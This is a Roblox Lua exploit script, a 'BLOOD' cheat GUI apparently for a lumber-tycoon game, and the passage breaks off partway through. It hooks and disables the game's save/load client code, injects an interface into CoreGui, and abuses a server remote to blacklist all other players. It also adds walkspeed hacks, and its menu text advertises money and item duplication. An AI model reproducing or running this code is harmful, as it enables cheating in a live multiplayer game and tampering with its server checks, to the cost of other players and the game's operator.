for i,v in pairs(getreg()) do 
   if typeof(v) == "function" and getfenv(v).script == game.Players.LocalPlayer.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript then 
       hookfunction(v, function() end)
   end
end

Intro = Instance.new("ScreenGui")
IntroImage = Instance.new("ImageLabel")
_1 = Instance.new("TextLabel")
_2 = Instance.new("TextLabel")
_3 = Instance.new("TextLabel")
_4 = Instance.new("TextLabel")
_5 = Instance.new("TextLabel")
_6 = Instance.new("TextLabel")
_7 = Instance.new("TextLabel")

-- Properties

Intro.Name = "Intro"
Intro.Parent = game.CoreGui

IntroImage.Name = "IntroImage"
IntroImage.Parent = Intro
IntroImage.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
IntroImage.BackgroundTransparency = 1
IntroImage.BorderColor3 = Color3.new(1, 1, 1)
IntroImage.BorderSizePixel = 0
IntroImage.Position = UDim2.new(0.400, 0, 0.200, 0)
IntroImage.Size = UDim2.new(0, 356, 0, 347)
IntroImage.Image = "rbxassetid://1130382821"

_1.Name = "1"
_1.Parent = IntroImage
_1.BackgroundColor3 = Color3.fromRGB(249, 214, 46)
_1.BackgroundTransparency = 1
_1.BorderSizePixel = 0
_1.Position = UDim2.new(0.109550565, 0, 0.423631132, 0)
_1.Size = UDim2.new(0, 40, 0, 53)
_1.Font = Enum.Font.ArialBold
_1.FontSize = Enum.FontSize.Size14
_1.Text = " "
_1.TextColor3 = Color3.new(255, 0, 0)
_1.TextScaled = true
_1.TextSize = 14
_1.TextWrapped = true

_2.Name = "2"
_2.Parent = IntroImage
_2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
_2.BackgroundTransparency = 1
_2.BorderSizePixel = 0
_2.Position = UDim2.new(0.221910119, 0, 0.423631132, 0)
_2.Size = UDim2.new(0, 40, 0, 53)
_2.Font = Enum.Font.ArialBold
_2.FontSize = Enum.FontSize.Size14
_2.Text = "B"
_2.TextColor3 = Color3.new(255, 0, 0)
_2.TextScaled = true
_2.TextSize = 14
_2.TextWrapped = true

_3.Name = "3"
_3.Parent = IntroImage
_3.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
_3.BackgroundTransparency = 1
_3.BorderSizePixel = 0
_3.Position = UDim2.new(0.334269673, 0, 0.423631132, 0)
_3.Size = UDim2.new(0, 40, 0, 53)
_3.Font = Enum.Font.ArialBold
_3.FontSize = Enum.FontSize.Size14
_3.Text = "L"
_3.TextColor3 = Color3.new(255, 0, 0)
_3.TextScaled = true
_3.TextSize = 14
_3.TextWrapped = true

_4.Name = "4"
_4.Parent = IntroImage
_4.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
_4.BackgroundTransparency = 1
_4.BorderSizePixel = 0
_4.Position = UDim2.new(0.446629226, 0, 0.423631132, 0)
_4.Size = UDim2.new(0, 40, 0, 53)
_4.Font = Enum.Font.ArialBold
_4.FontSize = Enum.FontSize.Size14
_4.Text = "O"
_4.TextColor3 = Color3.new(255, 0, 0)
_4.TextScaled = true
_4.TextSize = 14
_4.TextWrapped = true

_5.Name = "5"
_5.Parent = IntroImage
_5.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
_5.BackgroundTransparency = 1
_5.BorderSizePixel = 0
_5.Position = UDim2.new(0.55898881, 0, 0.423631132, 0)
_5.Size = UDim2.new(0, 40, 0, 53)
_5.Font = Enum.Font.ArialBold
_5.FontSize = Enum.FontSize.Size14
_5.Text = "O"
_5.TextColor3 = Color3.new(255, 0, 0)
_5.TextScaled = true
_5.TextSize = 14
_5.TextWrapped = true

_6.Name = "6"
_6.Parent = IntroImage
_6.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
_6.BackgroundTransparency = 1
_6.BorderSizePixel = 0
_6.Position = UDim2.new(0.671348333, 0, 0.423631132, 0)
_6.Size = UDim2.new(0, 40, 0, 53)
_6.Font = Enum.Font.ArialBold
_6.FontSize = Enum.FontSize.Size14
_6.Text = "D"
_6.TextColor3 = Color3.new(255, 0, 0)
_6.TextScaled = true
_6.TextSize = 14
_6.TextWrapped = true

_7.Name = "7"
_7.Parent = IntroImage
_7.BackgroundColor3 = Color3.new(1, 1, 1)
_7.BackgroundTransparency = 1
_7.BorderSizePixel = 0
_7.Position = UDim2.new(0.775280893, 0, 0.423631132, 0)
_7.Size = UDim2.new(0, 40, 0, 53)
_7.Font = Enum.Font.ArialBold
_7.FontSize = Enum.FontSize.Size14
_7.Text = " "
_7.TextColor3 = Color3.new(255, 0, 0)
_7.TextScaled = true
_7.TextSize = 14
_7.TextWrapped = true



_1.TextTransparency = 0.2
wait()
_2.TextTransparency = 0.2
wait()
_3.TextTransparency = 0.2
wait()
_4.TextTransparency = 0.2
wait()
_5.TextTransparency = 0.2
wait()
_6.TextTransparency = 0.2
wait()
_7.TextTransparency = 0.2
wait()
IntroImage.ImageTransparency = 0.2
wait()
_1.TextTransparency = 0.3
wait()
_2.TextTransparency = 0.3
wait()
_3.TextTransparency = 0.3
wait()
_4.TextTransparency = 0.3
wait()
_5.TextTransparency = 0.3
wait()
_6.TextTransparency = 0.3
wait()
_7.TextTransparency = 0.3
wait()
IntroImage.ImageTransparency = 0.3
wait()
_1.TextTransparency = 0.4
wait()
_2.TextTransparency = 0.4
wait()
_3.TextTransparency = 0.4
wait()
_4.TextTransparency = 0.4
wait()
_5.TextTransparency = 0.4
wait()
_6.TextTransparency = 0.4
wait()
_7.TextTransparency = 0.4
wait()
IntroImage.ImageTransparency = 0.4
wait()
_1.TextTransparency = 0.5
wait()
_2.TextTransparency = 0.5
wait()
_3.TextTransparency = 0.4
wait()
_4.TextTransparency = 0.5
wait()
_5.TextTransparency = 0.5
wait()
_6.TextTransparency = 0.5
wait()
_7.TextTransparency = 0.5
wait()
IntroImage.ImageTransparency = 0.5
wait()
_1.TextTransparency = 0.6
wait()
_2.TextTransparency = 0.6
wait()
_3.TextTransparency = 0.6
wait()
_4.TextTransparency = 0.6
wait()
_5.TextTransparency = 0.6
wait()
_6.TextTransparency = 0.6
wait()
_7.TextTransparency = 0.6
wait()
IntroImage.ImageTransparency = 0.6
wait()
_1.TextTransparency = 0.7
wait()
_2.TextTransparency = 0.7
wait()
_3.TextTransparency = 0.7
wait()
_4.TextTransparency = 0.7
wait()
_5.TextTransparency = 0.7
wait()
_6.TextTransparency = 0.7
wait()
_7.TextTransparency = 0.7
wait()
IntroImage.ImageTransparency = 0.7
wait()
_1.TextTransparency = 0.8
wait()
_2.TextTransparency = 0.8
wait()
_3.TextTransparency = 0.8
wait()
_4.TextTransparency = 0.8
wait()
_5.TextTransparency = 0.8
wait()
_6.TextTransparency = 0.8
wait()
_7.TextTransparency = 0.8
wait()
IntroImage.ImageTransparency = 0.8
wait()
_1.TextTransparency = 0.9
wait()
_2.TextTransparency = 0.9
wait()
_3.TextTransparency = 0.9
wait()
_4.TextTransparency = 0.9
wait()
_5.TextTransparency = 0.9
wait()
_6.TextTransparency = 0.9
wait()
_7.TextTransparency = 0.9
wait()
IntroImage.ImageTransparency = 0.9
wait()
_1.TextTransparency = 1
wait()
_2.TextTransparency = 1
wait()
_3.TextTransparency = 1
wait()
_4.TextTransparency = 1
wait()
_5.TextTransparency = 1
wait()
_6.TextTransparency = 1
wait()
_7.TextTransparency = 1
wait()
IntroImage.ImageTransparency = 0.9
wait()
_1.TextTransparency = 1.1
wait()
_2.TextTransparency = 1.1
wait()
_3.TextTransparency = 1.1
wait()
_4.TextTransparency = 1.1
wait()
_5.TextTransparency = 1.1
wait()
_6.TextTransparency = 1.1
wait()
_7.TextTransparency = 1.1
wait()
IntroImage.ImageTransparency = 5.1
wait()
Intro:Destroy()
wait()

local s = Instance.new("Sound")
s.Name = "Sound"
s.SoundId = "http://www.roblox.com/asset/?id=2528420941"
s.Volume = 0
s.Looped = false
s.archivable = false
s.Parent = game.Workspace
--Join

local k = Instance.new("Sound")
k.Name = "Soundzz"
k.SoundId = "http://www.roblox.com/asset/?id=305977837"
k.Volume = 0
k.Looped = false
k.archivable = false
k.Parent = game.Workspace
--Left

local q = Instance.new("Sound")
q.Name = "Soundzzzz"
q.SoundId = "http://www.roblox.com/asset/?id=249869145"
q.Volume = 0
q.Looped = false
q.archivable = false
q.Parent = game.Workspace
--Systems Online

local function SendNotification(title,text,duration,...)
  game.StarterGui:SetCore("SendNotification", {
    Title = title;
    Text = text;
    Icon = "";
    Duration = duration;
  })
end

  game.Players.ChildAdded:Connect(function(player)
  if not pcall (function()
  SendNotification("Player JOINED",""..player.Name.." has JOINED the game",5 )
  s:Play()
  end) then
    print ("Error")
  end
  end)
---------------------------------------------------------------------
  -- Same extra's apply down here as well.

  game.Players.ChildRemoved:Connect(function(player)
  if not pcall (function()
  SendNotification("Player LEFT",""..player.Name.." has LEFT the game",4.4 )
  k:Play()
  end) then
    print ("Error")
  end
  end)
  
  SendNotification("Loaded","Join and leave detector is loaded",2)
  q:Play()

-- Variables --

local Script = "BLOOD"
local gFont = "SourceSans"
local Visi = true

-- Functions -- 

function Log(text, r, g, b, font)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "{" .. tostring(Script) .. "} - " .. text;
    Color = Color3.new(r, g, b);
    Font = Enum.Font[font];
    FontSize = Enum.FontSize.Size10;
    })
end

---------------------------------------------------------------------
-- Automatically Add players to Blacklist --

Mouse = game.Players.LocalPlayer:GetMouse()


Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"

Client = game.ReplicatedStorage.Interaction.ClientSetListPlayer
players = game.Players
for i, v in pairs(players:GetPlayers()) do
	if v.Name ~= players.LocalPlayer.Name then
		Client:InvokeServer(players.LocalPlayer.BlacklistFolder, v, true)
	end
end
players.PlayerAdded:connect(function(plr)
	Client:InvokeServer(players.LocalPlayer.BlacklistFolder, plr, true)
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
  Title = "BLOOD",
  Text = "Loaded Successful."
})

local players = game:GetService('Players')
if game.Players.LocalPlayer then 
game.StarterGui:SetCore('SendNotification', {
    Title = ' '.. players.LocalPlayer.Name..'!',
    Text = 'Welcome to Bloods GUI!',
    Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..players.LocalPlayer.Name..[[&RAND]] .. math.random(1,10000000),
    Duration = 5,
   })
  end

---------------------------------------------------------------------

--Properties:

BLOOD = Instance.new("ScreenGui")
BLOOD.Name = "BLOOD"
BLOOD.Parent = game.CoreGui

OpenFrame = Instance.new("Frame")
OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = BLOOD
OpenFrame.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
OpenFrame.BorderColor3 = Color3.fromRGB(196, 40, 28)
OpenFrame.Position = UDim2.new(0, -621, 0, 611)
OpenFrame.Size = UDim2.new(0, 80, 0, 40)
OpenFrame:TweenPosition(UDim2.new(0, 18, 0, 685), "In", "Back",2.5)

Open = Instance.new("ImageButton")
Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0, 0, 0)
Open.BorderColor3 = Color3.new(0, 0, 0)
Open.Size = UDim2.new(0, 80, 0, 40)
Open.Image = "rbxassetid://4889132908"
Open.Selectable = true

Open.MouseEnter:connect(function()
InfoText1.Visible = true
end)

Open.MouseLeave:connect(function()
InfoText1.Visible = false
end)

InfoText1 = Instance.new("TextLabel")
InfoText1.Name = "InfoText1"
InfoText1.Parent = OpenFrame
InfoText1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText1.BorderColor3 = Color3.new(0, 0, 0)
InfoText1.BackgroundTransparency = 0.5
InfoText1.Position = UDim2.new(0, 5, 0, 50)
InfoText1.Size = UDim2.new(0, 190, 0, 100)
InfoText1.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText1.Font = Enum.Font.Fantasy
InfoText1.Text = "This Gui was created by Oddy\nCredits:\nWho Ever Made The Script."
InfoText1.TextSize = 15
InfoText1.TextWrapped = true
InfoText1.Visible = false
InfoText1.ZIndex = 7
InfoText1.TextYAlignment = Enum.TextYAlignment.Top

MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = BLOOD
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainFrame.Position = UDim2.new(0.0111675123, 0, 0.436827958, 0)
MainFrame.Selectable = true
MainFrame.Size = UDim2.new(0, 500, 0, 500)
MainFrame.Visible = false

ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "ImageLabel"
ImageLabel.Parent = MainFrame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.Position = UDim2.new(-0.000475523295, 0, -0.00117481197, 0)
ImageLabel.Size = UDim2.new(0, 500, 0, 500)
ImageLabel.Image = "rbxassetid://3883502641"

CloseBLOOD = Instance.new("TextButton")
CloseBLOOD.Name = "CloseBLOOD"
CloseBLOOD.Parent = MainFrame
CloseBLOOD.BackgroundColor3 = Color3.new(0, 0, 0)
CloseBLOOD.BorderColor3 = Color3.fromRGB(196, 40, 28)
CloseBLOOD.Position = UDim2.new(0, 5, 0, 5)
CloseBLOOD.Size = UDim2.new(0, 20, 0, 20)
CloseBLOOD.Font = Enum.Font.Fantasy
CloseBLOOD.FontSize = Enum.FontSize.Size18
CloseBLOOD.Text = "X"
CloseBLOOD.TextColor3 = Color3.new(1, 1, 1)
CloseBLOOD.TextScaled = true
CloseBLOOD.TextWrapped = true
CloseBLOOD.TextSize = 17

Minimize = Instance.new("TextButton")
Minimize.Name = "Minimize"
Minimize.Parent = MainFrame
Minimize.BackgroundColor3 = Color3.new(0, 0, 0)
Minimize.BorderColor3 = Color3.fromRGB(196, 40, 28)
Minimize.Position = UDim2.new(0, 26, 0, 5)
Minimize.Size = UDim2.new(0, 20, 0, 20)
Minimize.Font = Enum.Font.Fantasy
Minimize.FontSize = Enum.FontSize.Size18
Minimize.Text = "-"
Minimize.TextColor3 = Color3.new(1, 1, 1)
Minimize.TextScaled = true
Minimize.TextWrapped = true
Minimize.TextSize = 17

MenuFrame = Instance.new("Frame")
MenuFrame.Name = "MenuFrame"
MenuFrame.Parent = MainFrame
MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MenuFrame.BackgroundTransparency = 1
MenuFrame.BorderColor3 = Color3.new(0, 1, 0)
MenuFrame.Position = UDim2.new(0, 5, 0, 30)
MenuFrame.Size = UDim2.new(0, 170, 0,400)

MenuFramea = Instance.new("Frame")
MenuFramea.Name = "MenuFrame"
MenuFramea.Parent = MainFrame
MenuFramea.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
MenuFramea.BackgroundTransparency = 1
MenuFramea.BorderColor3 = Color3.new(0, 1, 0)
MenuFramea.Position = UDim2.new(0, 270, 0, 140)
MenuFramea.Size = UDim2.new(0, 120, 0,350)

AIntroImage = Instance.new("ImageButton")
AIntroImage.Name = "IntroImage"
AIntroImage.Parent = MainFrame
AIntroImage.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
AIntroImage.BackgroundTransparency = 1
AIntroImage.BorderColor3 = Color3.new(1, 1, 1)
AIntroImage.BorderSizePixel = 0
AIntroImage.Position = UDim2.new(0, 50, 0, 325)
AIntroImage.Size = UDim2.new(0, 80, 0, 40)
AIntroImage.Image = "rbxassetid://4889132908"
AIntroImage.Visible = true

AIntroImage1 = Instance.new("ImageLabel")
AIntroImage1.Name = "IntroImage"
AIntroImage1.Parent = MainFrame
AIntroImage1.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
AIntroImage1.BackgroundTransparency = 1
AIntroImage1.BorderColor3 = Color3.new(1, 1, 1)
AIntroImage1.BorderSizePixel = 0
AIntroImage1.Position = UDim2.new(0, 30, 0, 370)
AIntroImage1.Size = UDim2.new(0, 120, 0, 120)
AIntroImage1.Image = "rbxassetid://3940167130"
AIntroImage1.Visible = false

AIntroImage2 = Instance.new("ImageLabel")
AIntroImage2.Name = "IntroImage"
AIntroImage2.Parent = MainFrame
AIntroImage2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
AIntroImage2.BackgroundTransparency = 1
AIntroImage2.BorderColor3 = Color3.new(1, 1, 1)
AIntroImage2.BorderSizePixel = 0
AIntroImage2.Position = UDim2.new(0, 40, 0, 390)
AIntroImage2.Size = UDim2.new(0, 60, 0, 100)
AIntroImage2.Image = "rbxassetid://4910802321"
AIntroImage2.Visible = true

AIntroImage3 = Instance.new("ImageLabel")
AIntroImage3.Name = "IntroImage"
AIntroImage3.Parent = MainFrame
AIntroImage3.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
AIntroImage3.BackgroundTransparency = 1
AIntroImage3.BorderColor3 = Color3.new(1, 1, 1)
AIntroImage3.BorderSizePixel = 0
AIntroImage3.Position = UDim2.new(0, 105, 0, 390)
AIntroImage3.Size = UDim2.new(0, 60, 0, 100)
AIntroImage3.Image = "rbxassetid://4910802958"
AIntroImage3.Visible = true

BloodFrameInfo = Instance.new("TextLabel")
BloodFrameInfo.Name = "BloodFrameInfo"
BloodFrameInfo.Parent = MenuFrame
BloodFrameInfo.BackgroundColor3 = Color3.new(0, 0, 0)
BloodFrameInfo.BackgroundTransparency = 0.3
BloodFrameInfo.Position = UDim2.new(0, 3, 0, 3)
BloodFrameInfo.Size = UDim2.new(0, 164, 0, 290)
BloodFrameInfo.Font = Enum.Font.Fantasy
BloodFrameInfo.Text = "Made By\nODDY\n\nAUTO BUY FIXED\n\nRemoved all patched Scipts.\n\nNew Dupe and MoneyDupe.\n\nBuy Powers do not have to goto Cave.\n\nDupe Axes Fixed.\n\nBase Sorter Added .\n\nThanks To SCRIPT MAKERS"
BloodFrameInfo.TextColor3 = Color3.fromRGB(245, 205, 48)
BloodFrameInfo.TextWrapped = true
BloodFrameInfo.TextSize = 14
BloodFrameInfo.Visible = true

Depart = Instance.new("TextLabel")
Depart.Name = "Depart"
Depart.Parent = MainFrame
Depart.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
Depart.BorderColor3 = Color3.new(0, 0, 0)
Depart.BorderSizePixel = 2
Depart.Position = UDim2.new(0, 50, 0, 5)
Depart.Size = UDim2.new(0, 130, 0, 20)
Depart.BackgroundTransparency=1
Depart.Font = Enum.Font.Fantasy
Depart.FontSize = Enum.FontSize.Size18
Depart.Text = "Ferry Departs: 0"
Depart.TextColor3 = Color3.new(0, 1, 0)
Depart.TextSize = 15
Depart.TextStrokeColor3 = Color3.new(1, 1, 1)
Depart.TextWrapped = true

game.Workspace.Ferry.TimeToDeparture.Changed:connect(function()
Depart.Text = "Ferry Departs: ".. game.Workspace.Ferry.TimeToDeparture.Value
if Depart.Text == "Ferry Departs: 0" then 
	wait(6)
	Depart.Text = "Ferry has Departed"
else
	Depart.Text = "Ferry Departs: ".. game.Workspace.Ferry.TimeToDeparture.Value
end
end)

ChangeItem = Instance.new("Frame")
ChangeItem.Name = "ChangeItem"
ChangeItem.Parent = MainFrame
ChangeItem.BackgroundColor3 = Color3.fromRGB(193, 40, 28)
ChangeItem.BorderColor3 = Color3.new(0, 0, 0)
ChangeItem.BorderSizePixel = 2
ChangeItem.Position = UDim2.new(0, 390, 1, -110)
ChangeItem.Size = UDim2.new(0, 100, 0, 100)
ChangeItem.ZIndex = 2

CurrentItem = Instance.new("ImageButton")
CurrentItem.Name = "CurrentItem"
CurrentItem.Parent = ChangeItem
CurrentItem.BackgroundColor3 = Color3.new(1, 1, 1)
CurrentItem.BorderColor3 = Color3.new(0, 0, 0)
CurrentItem.BorderSizePixel = 2
CurrentItem.Position = UDim2.new(0, 10, 0, 10)
CurrentItem.Size = UDim2.new(0, 80, 0, 80)
CurrentItem.ZIndex = 2
CurrentItem.Image = "rbxassetid://3886256996"
CurrentItem.ScaleType = Enum.ScaleType.Crop

Picker = Instance.new("ScrollingFrame")
Picker.Name = "Picker"
Picker.Parent = MainFrame
Picker.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Picker.BorderColor3 = Color3.new(0, 0, 0)
Picker.BorderSizePixel = 2
Picker.Position = UDim2.new(0, 390, 1, -460)
Picker.Size = UDim2.new(0, 100, 0, 345)
Picker.CanvasPosition = Vector2.new(0,0)
Picker.CanvasSize = UDim2.new(0, 0, 0, 685)
Picker.ScrollBarThickness = 10
Picker.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
Picker.Visible = true

ctheme = Instance.new("TextButton")
ctheme.Name = "ctheme"
ctheme.Parent = MainFrame
ctheme.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
ctheme.BorderColor3 = Color3.new(0, 0, 0)
ctheme.BorderSizePixel = 2
ctheme.Position = UDim2.new(0, 170, 0, 5)
ctheme.Size = UDim2.new(0, 130, 0, 20)
ctheme.BackgroundTransparency=1
ctheme.Font = Enum.Font.Fantasy
ctheme.FontSize = Enum.FontSize.Size18
ctheme.Text = "DARK BLOOD"
ctheme.TextColor3 = Color3.new(0, 0, 1)
ctheme.TextSize = 15
ctheme.TextStrokeColor3 = Color3.new(1, 1, 1)
ctheme.TextWrapped = true
ctheme.MouseButton1Down:connect(function()
ImageLabel.Image = "rbxassetid://4501090530"
BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
end)

ctheme1 = Instance.new("TextButton")
ctheme1.Name = "ctheme"
ctheme1.Parent = MainFrame
ctheme1.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
ctheme1.BorderColor3 = Color3.new(0, 0, 0)
ctheme1.BorderSizePixel = 2
ctheme1.Position = UDim2.new(0, 275, 0, 5)
ctheme1.Size = UDim2.new(0, 130, 0, 20)
ctheme1.BackgroundTransparency=1
ctheme1.Font = Enum.Font.Fantasy
ctheme1.FontSize = Enum.FontSize.Size18
ctheme1.Text = "DARK XMAS"
ctheme1.TextColor3 = Color3.new(0, 0, 1)
ctheme1.TextSize = 15
ctheme1.TextStrokeColor3 = Color3.new(0, 0, 1)
ctheme1.TextWrapped = true
ctheme1.MouseButton1Down:connect(function()
ImageLabel.Image = "rbxassetid://4501461226"
BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
end)

ctheme2 = Instance.new("TextButton")
ctheme2.Name = "ctheme"
ctheme2.Parent = MainFrame
ctheme2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
ctheme2.BorderColor3 = Color3.new(0, 0, 0)
ctheme2.BorderSizePixel = 2
ctheme2.Position = UDim2.new(0, 360, 0, 5)
ctheme2.Size = UDim2.new(0, 130, 0, 20)
ctheme2.BackgroundTransparency=1
ctheme2.Font = Enum.Font.Fantasy
ctheme2.FontSize = Enum.FontSize.Size18
ctheme2.Text = "RED XMAS"
ctheme2.TextColor3 = Color3.new(0, 0, 1)
ctheme2.TextSize = 15
ctheme2.TextStrokeColor3 = Color3.new(1, 1, 1)
ctheme2.TextWrapped = true
ctheme2.MouseButton1Down:connect(function()
ImageLabel.Image = "rbxassetid://4501461429"
BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
end)

Player = Instance.new("ImageButton")
Player.Name = "Player"
Player.Parent = Picker
Player.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Player.BorderColor3 = Color3.new(0, 0, 0)
Player.Position = UDim2.new(0, 15, 0, 5)
Player.Size = UDim2.new(0, 80, 0, 80)
Player.ZIndex = 3
Player.Image = "rbxassetid://4892950869"
Player.ScaleType = Enum.ScaleType.Crop
Player.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892950869"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
TimesFrame.Visible = true
PlayerFrame = true
end)

PlayerFrame = Instance.new("Frame")
PlayerFrame.Name = "PlayerFrame"
PlayerFrame.Parent = MenuFrame
PlayerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
PlayerFrame.BackgroundTransparency = 0.5
PlayerFrame.BorderColor3 = Color3.new(0, 0, 0)
PlayerFrame.Size = UDim2.new(0, 378, 0, 460)
PlayerFrame.Visible = false

PlayerTitle = Instance.new("TextLabel")
PlayerTitle.Name = "PlayerTitle"
PlayerTitle.Parent = PlayerFrame
PlayerTitle.BackgroundColor3 = Color3.new(1, 0, 0)
PlayerTitle.BackgroundTransparency = 0.10000000149012
PlayerTitle.BorderColor3 = Color3.new(1, 0, 0)
PlayerTitle.Position = UDim2.new(0, 5, 0, 5)
PlayerTitle.Size = UDim2.new(0, 160, 0, 20)
PlayerTitle.Font = Enum.Font.Fantasy
PlayerTitle.Text = "Player Tools"
PlayerTitle.TextColor3 = Color3.new(1, 1, 1)
PlayerTitle.TextSize = 14

WalkspeedLabel = Instance.new("TextButton")
WalkspeedLabel.Name = "WalkspeedLabel"
WalkspeedLabel.Parent = PlayerFrame
WalkspeedLabel.BackgroundColor3 = Color3.new(0, 0, 0)
WalkspeedLabel.BackgroundTransparency = 0.6
WalkspeedLabel.BorderColor3 = Color3.new(1, 0, 0)
WalkspeedLabel.Position = UDim2.new(0, 3, 0, 28)
WalkspeedLabel.Size = UDim2.new(0, 140, 0, 20)
WalkspeedLabel.Font = Enum.Font.Fantasy
WalkspeedLabel.Text = "Walkspeed"
WalkspeedLabel.TextColor3 = Color3.new(1, 1, 1)
WalkspeedLabel.TextSize = 14

WalkSpeed = Instance.new("TextLabel")
WalkSpeed.Name = "WalkSpeed"
WalkSpeed.Parent = PlayerFrame
WalkSpeed.BackgroundColor3 = Color3.new(0, 0, 0)
WalkSpeed.BorderColor3 = Color3.new(1, 0, 0)
WalkSpeed.BackgroundTransparency = 0.6
WalkSpeed.Position = UDim2.new(0, 147, 0, 28)
WalkSpeed.Size = UDim2.new(0, 21, 0, 20)
WalkSpeed.Font = Enum.Font.Fantasy
WalkSpeed.Text = "V"
WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
WalkSpeed.TextSize = 14

WalkspeedLabel.MouseButton1Down:connect(function()
	 local walkspeedplayer = game:GetService("Players").LocalPlayer
    local walkspeedmouse = walkspeedplayer:GetMouse()
    
    local walkspeedenabled = false
    
  function x_walkspeed(key)
        if (key == "v") then
            if walkspeedenabled == false then
                 _G.WS = 150;

                local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
                Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                Humanoid.WalkSpeed = _G.WS;
                end)
                Humanoid.WalkSpeed = _G.WS;
                
                walkspeedenabled = true
            elseif walkspeedenabled == true then
                _G.WS = 15;
                local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
                Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                Humanoid.WalkSpeed = _G.WS;
                end)
                Humanoid.WalkSpeed = _G.WS;
                
                walkspeedenabled = false
            end
        end
    end
    
    walkspeedmouse.KeyDown:connect(x_walkspeed)

end)

JumpText = Instance.new("TextBox")
JumpText.Name = "JumpText"
JumpText.Parent = PlayerFrame
JumpText.BackgroundColor3 = Color3.new(0, 0, 0)
JumpText.BackgroundTransparency = 0.6
JumpText.BorderColor3 = Color3.new(1, 0, 0)
JumpText.Position = UDim2.new(0, 147, 0, 51)
JumpText.Size = UDim2.new(0, 21, 0, 20)
JumpText.Font = Enum.Font.Fantasy
JumpText.Text = "50"
JumpText.TextColor3 = Color3.new(1, 1, 1)
JumpText.TextSize = 14

JumpPower = Instance.new("TextButton")
JumpPower.Name = "JumpPowerLabel"
JumpPower.Parent = PlayerFrame
JumpPower.BackgroundColor3 = Color3.new(0, 0, 0)
JumpPower.BackgroundTransparency = 0.6
JumpPower.BorderColor3 = Color3.new(1, 0, 0)
JumpPower.Position = UDim2.new(0, 3, 0, 51)
JumpPower.Size = UDim2.new(0, 140, 0, 20)
JumpPower.Font = Enum.Font.Fantasy
JumpPower.Text = "Jump Power"
JumpPower.TextColor3 = Color3.new(1, 1, 1)
JumpPower.TextSize = 14

player = game.Players.LocalPlayer
Jump = 50

